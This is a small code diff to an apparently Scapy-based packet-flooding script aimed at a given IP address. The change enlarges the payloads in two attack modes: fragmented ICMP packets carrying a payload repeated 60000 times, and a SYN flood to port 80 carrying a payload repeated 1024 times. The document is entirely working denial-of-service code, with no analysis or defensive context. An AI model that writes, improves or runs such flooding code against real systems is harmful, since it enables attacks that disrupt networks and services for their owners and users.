@@ -169,11 +169,11 @@ if args.ip:
 	
 
 	if args.icmp:
-		send(numPackets*(fragment(ip_layer/ICMP()/args.icmp)))
+		send(numPackets*(fragment(ip_layer/ICMP()/args.icmp*60000)))
 
 	elif args.syn:
 		tcp=TCP(sport=RandShort(), dport=80, flags="S")
-		raw=Raw(args.syn)
+		raw=Raw(args.syn*1024)
 		p=ip_layer/tcp/raw
 		print("Sending packets... Press CTRL+C to stop.")
 
